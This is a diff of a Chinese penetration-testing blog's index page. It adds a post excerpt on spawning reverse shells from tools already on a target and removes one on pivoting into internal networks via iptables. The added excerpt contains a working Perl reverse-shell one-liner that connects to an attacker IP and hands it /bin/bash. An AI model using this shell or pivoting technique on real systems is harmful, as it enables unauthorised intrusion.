@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/09/27/revese-shell/">
+                很多时候你需要的也许只是一个shell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,在实际渗透过程中想进行某些操作,我们迫切的需要一个可交互的shell,但你又不想上传工具到目标机器上,怎么办呢,希望下面的内容能对你有用,”利用目标机器上现有的环境弹回一个可交互的shell”(没错,coablt strike &amp; msf 会更方便,但今天只单纯的说reverse shell):<br><br></p>
+<h5 id="首先-可以先尝试利用linux系统现有的各种环境来弹shell"><a href="#首先-可以先尝试利用linux系统现有的各种环境来弹shell" class="headerlink" title="首先,可以先尝试利用linux系统现有的各种环境来弹shell:"></a>首先,可以先尝试利用linux系统现有的各种环境来弹shell:</h5><p>1,利用perl反弹,也是个人比较推荐的方式,因为现在几乎主流的linux发行版都已经预装了perl,你会发现很多大马里面默认也都会选择使用perl<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># perl -e 'use Socket;$i="192.168.3.251";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;'</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/09/26/install-py27-on-centos/">
                 在目标机器上快速编译安装py2.7
             </a>
@@ -359,41 +392,6 @@
 <p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
         </div>
         <a href="/2016/09/20/fpipe-redirect-port/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/19/iptables-portfward/">
-                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/iptabbles/">iptabbles</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器"><a href="#作用和netsh差不多-这里就不废话了-直接看操作-还是同样的情况-只不过你此时拿下的是边界的一台linux服务器-依然想通过这台机器直接去访问内网的其它机器" class="headerlink" title="作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器"></a>作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</h5><p><br></p>
-<p>1,环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn): <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
-<p>2,最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的服务</div></pre></td></tr></table></figure></p>
-<p>3,具体过程如下,首先,编辑边界linux系统的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/19/iptables-portfward/" class="read-more">Read More</a>
     
 
 </div>
